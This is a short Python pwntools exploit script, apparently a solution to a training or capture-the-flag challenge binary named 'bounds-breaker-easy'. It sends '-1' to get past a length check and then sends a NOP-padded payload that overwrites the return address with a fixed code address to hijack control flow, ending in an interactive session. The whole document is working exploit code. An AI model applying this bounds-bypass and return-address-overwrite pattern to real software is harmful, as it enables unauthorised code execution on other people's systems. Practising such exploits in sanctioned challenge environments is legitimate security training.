#!/usr/bin/env python3
from pwn import *

p = process('/challenge/bounds-breaker-easy')

padding = 0x7ffea42aa208 - 0x7ffea42aa1b0

payload = b'\x90' * padding + p64(0x40198c)

p.sendline(b"-1")

p.send(payload)

p.interactive()

